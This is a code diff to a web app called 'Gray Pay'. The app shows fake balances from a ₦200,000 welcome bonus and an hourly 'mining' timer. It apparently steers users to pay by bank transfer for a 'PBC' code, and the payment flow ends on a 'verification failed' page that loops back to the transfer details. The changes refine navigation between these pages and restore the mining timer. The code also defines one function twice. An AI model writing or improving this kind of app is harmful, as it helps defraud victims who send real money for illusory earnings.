@@ -490,6 +490,7 @@
     let currentUser = null;
     let users = JSON.parse(localStorage.getItem('graypay_users') || '[]');
     let miningIntervals = {};
+    let pbcFlowHistory = [];
 
     function saveUsers() { localStorage.setItem('graypay_users', JSON.stringify(users)); }
 
@@ -536,6 +537,15 @@
             let user = users.find(u => u.email === savedUserEmail);
             if (user) {
                 currentUser = user;
+                
+                // Restore mining interval if it was active
+                if (currentUser.miningActive && currentUser.miningEndTime && currentUser.miningEndTime > Date.now()) {
+                    startMiningInterval();
+                } else if (currentUser.miningActive && currentUser.miningEndTime && currentUser.miningEndTime <= Date.now()) {
+                    currentUser.miningActive = false;
+                    saveUsers();
+                }
+                
                 let lastScreen = localStorage.getItem('graypay_last_screen');
                 if (lastScreen && document.getElementById(lastScreen)) {
                     showScreen(lastScreen);
@@ -547,6 +557,33 @@
         }
         showWelcome();
         return false;
+    }
+
+    function startMiningInterval() {
+        if (miningIntervals[currentUser.id]) clearInterval(miningIntervals[currentUser.id]);
+        
+        if (currentUser.miningEndTime && Date.now() >= currentUser.miningEndTime) {
+            currentUser.miningActive = false;
+            saveUsers();
+            updateDashboard();
+            return;
+        }
+        
+        miningIntervals[currentUser.id] = setInterval(() => {
+            if (!currentUser || !currentUser.miningActive) return;
+            if (Date.now() >= currentUser.miningEndTime) {
+                clearInterval(miningIntervals[currentUser.id]);
+                currentUser.miningActive = false;
+                saveUsers();
+                alert('Mining complete! You earned ₦200,000!');
+                updateDashboard();
+                return;
+            }
+            let added = Math.floor(200000 / 24);
+            currentUser.balance += added;
+            saveUsers();
+            updateDashboard();
+        }, 3600000);
     }
 
     function saveCurrentUserSession(email) {
@@ -602,7 +639,9 @@
         if (!currentUser.hasSeenBonus) {
             currentUser.hasSeenBonus = true;
             saveUsers();
-            showNotification('Welcome to Gray Pay! You have a welcome bonus of ₦200,000 on your dashboard.');
+            setTimeout(() => {
+                showNotification('Welcome to Gray Pay! You have a welcome bonus of ₦200,000 on your dashboard.');
+            }, 500);
         }
     }
 
@@ -634,6 +673,7 @@
     function showProfile() {
         if (!currentUser) return;
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        removeDynamicViews();
         
         let profileDiv = document.createElement('div');
         profileDiv.id = 'profileView';
@@ -655,19 +695,23 @@
         localStorage.setItem('graypay_last_screen', 'profileView');
     }
 
-    function goBackToDashboard() {
+    function removeDynamicViews() {
         let views = ['profileView', 'withdrawView', 'airtimeView', 'dataView', 'pbcView', 'historyView', 'palmPayWarningView', 'bankTransferView', 'failedView'];
         views.forEach(id => {
             let el = document.getElementById(id);
             if (el) el.remove();
         });
+    }
+
+    function goBackToDashboard() {
+        removeDynamicViews();
         showDashboard();
     }
 
     function logout() {
         currentUser = null;
         clearUserSession();
-        goBackToDashboard();
+        removeDynamicViews();
         showWelcome();
     }
 
@@ -675,6 +719,7 @@
     function showWithdrawPage() {
         if (!currentUser) return;
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        removeDynamicViews();
         
         let banks = ['Access Bank', 'GTBank', 'First Bank', 'Zenith Bank', 'UBA', 'WEMA Bank', 'Polaris Bank', 'Fidelity Bank', 'Sterling Bank', 'PalmPay', 'Opay', 'Moniepoint', 'Kuda Bank'];
         let bankOptions = banks.map(b => `<option>${b}</option>`).join('');
@@ -724,6 +769,7 @@
     function showBuyAirtime() {
         if (!currentUser) return;
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        removeDynamicViews();
         
         let airtimeDiv = document.createElement('div');
         airtimeDiv.id = 'airtimeView';
@@ -767,6 +813,7 @@
     function showBuyData() {
         if (!currentUser) return;
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        removeDynamicViews();
         
         let dataDiv = document.createElement('div');
         dataDiv.id = 'dataView';
@@ -815,10 +862,14 @@
         });
     }
 
-    // ========== BUY PBC FULL FLOW ==========
+    // ========== BUY PBC FULL FLOW - SEPARATE PAGES ==========
+    let pbcName = '';
+    let pbcEmail = '';
+
     function showBuyPBC() {
         if (!currentUser) return;
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        removeDynamicViews();
         
         let pbcDiv = document.createElement('div');
         pbcDiv.id = 'pbcView';
@@ -844,6 +895,8 @@
         let btn = document.getElementById('payBtnPBC');
         function checkFields() { 
             if (nameInp.value && emailInp.value) {
+                pbcName = nameInp.value;
+                pbcEmail = emailInp.value;
                 btn.disabled = false;
                 btn.className = 'btn btn-enabled';
             } else {
@@ -862,6 +915,7 @@
     }
 
     function showPalmPayWarning() {
+        removeDynamicViews();
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
         
         let warningDiv = document.createElement('div');
@@ -871,7 +925,7 @@
         warningDiv.style.padding = '20px';
         warningDiv.innerHTML = `
             <div class="header">
-                <button class="back-btn" onclick="goBackToDashboard()">←</button>
+                <button class="back-btn" onclick="goBackToPBC()">←</button>
                 <button class="help-btn" onclick="showHelpOptions()">❓ You Need Help?</button>
             </div>
             <div class="warning-box">
@@ -883,10 +937,15 @@
             <button class="btn" onclick="proceedToBankTransfer()">I Understand</button>
         `;
         document.querySelector('.app-container').appendChild(warningDiv);
-        localStorage.setItem('graypay_last_screen', 'palmPayWarningView');
+    }
+
+    function goBackToPBC() {
+        removeDynamicViews();
+        showBuyPBC();
     }
 
     function proceedToBankTransfer() {
+        removeDynamicViews();
         showLoading('Processing...', 5000, () => {
             showBankDetailsPage();
         });
@@ -911,7 +970,7 @@
         bankDiv.style.padding = '20px';
         bankDiv.innerHTML = `
             <div class="header">
-                <button class="back-btn" onclick="goBackToDashboard()">←</button>
+                <button class="back-btn" onclick="goBackToPalmPayWarning()">←</button>
                 <button class="help-btn" onclick="showHelpOptions()">❓ You Need Help?</button>
             </div>
             <h2>Bank Transfer</h2>
@@ -929,7 +988,11 @@
             <button class="btn btn-primary" onclick="processIHavePaid()">I have made this bank transfer</button>
         `;
         document.querySelector('.app-container').appendChild(bankDiv);
-        localStorage.setItem('graypay_last_screen', 'bankTransferView');
+    }
+
+    function goBackToPalmPayWarning() {
+        removeDynamicViews();
+        showPalmPayWarning();
     }
 
     function processIHavePaid() {
@@ -948,18 +1011,22 @@
         failedDiv.style.padding = '20px';
         failedDiv.innerHTML = `
             <div class="header">
-                <button class="back-btn" onclick="goBackToDashboard()">←</button>
+                <button class="back-btn" onclick="goBackToBankDetails()">←</button>
                 <button class="help-btn" onclick="showHelpOptions()">❓ You Need Help?</button>
             </div>
             <div class="warning-box">
                 <h2>Transaction verification failed!</h2>
                 <p>Your payment could not be completed. Reason: No Payment received from you / invalid payment method.</p>
             </div>
-            <button class="btn btn-primary" onclick="showBankDetailsPage()">Try Again</button>
+            <button class="btn btn-primary" onclick="goBackToBankDetails()">Try Again</button>
             <button class="btn" onclick="showHelpOptions()">❓ You Need Help?</button>
         `;
         document.querySelector('.app-container').appendChild(failedDiv);
-        localStorage.setItem('graypay_last_screen', 'failedView');
+    }
+
+    function goBackToBankDetails() {
+        removeDynamicViews();
+        showBankDetailsPage();
     }
 
     // ========== MINING ==========
@@ -971,8 +1038,19 @@
         currentUser.miningEndTime = endTime;
         saveUsers();
         alert('Your mining has started now! Balance will increase every hour.');
-        
+        startMiningInterval();
+    }
+
+    function startMiningInterval() {
         if (miningIntervals[currentUser.id]) clearInterval(miningIntervals[currentUser.id]);
+        
+        if (currentUser.miningEndTime && Date.now() >= currentUser.miningEndTime) {
+            currentUser.miningActive = false;
+            saveUsers();
+            updateDashboard();
+            return;
+        }
+        
         miningIntervals[currentUser.id] = setInterval(() => {
             if (!currentUser || !currentUser.miningActive) return;
             if (Date.now() >= currentUser.miningEndTime) {
@@ -994,6 +1072,7 @@
     function showTransactionHistory() {
         if (!currentUser) return;
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        removeDynamicViews();
         
         let historyHtml = currentUser.transactions.map(t => `<div class="info-box" style="cursor:pointer;" onclick="alert('Details: ${t.type} on ${t.date}\\nAmount: ₦${t.amount}\\nStatus: ${t.status}')">${t.type}: ₦${t.amount} - ${t.status}</div>`).join('');
         
@@ -1034,4 +1113,4 @@
     autoLoginAndRestore();
 </script>
 </body>
-</html> 
+</html>
